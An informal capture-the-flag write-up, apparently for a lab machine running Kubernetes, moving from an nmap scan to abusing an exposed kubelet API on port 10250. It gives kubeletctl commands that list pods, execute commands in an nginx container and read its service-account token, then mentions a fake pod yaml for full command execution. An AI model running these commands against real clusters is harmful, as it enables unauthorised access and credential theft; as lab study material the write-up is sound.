Started with a nmap scan
```
22/tcp    open  ssh              syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 
2379/tcp  open  ssl/etcd-client? syn-ack ttl 63
2380/tcp  open  ssl/etcd-server? syn-ack ttl 63
8443/tcp  open  ssl/https-alt    syn-ack ttl 63
10249/tcp open  http             syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10250/tcp open  ssl/http         syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API
10256/tcp open  http             syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```
When running a gobuster scan on port `10250` found this folder called `logs` and we can read all the logs for the pod going to this url we can see all the pods running on the host `https://10.10.11.133:10250/pods` and we can get RCE with nginx from the link we can see the path and now we can use `kubeletctl` now we can run this command `kubeletctl --server 10.10.11.133 pods` to list the pods running this command we can read files inside the pod `kubeletctl --server 10.10.11.133 exec ls -p nginx -c nginx` to get the token `kubeletctl --server 10.10.11.133 exec 'cat /var/run/secrets/kubernetes.io/serviceaccount/token' -p nginx -c nginx` and we can use the same command to get the certificate now we need to make a fake yaml file to load up a pod and now we can exacute commands and get both flags 
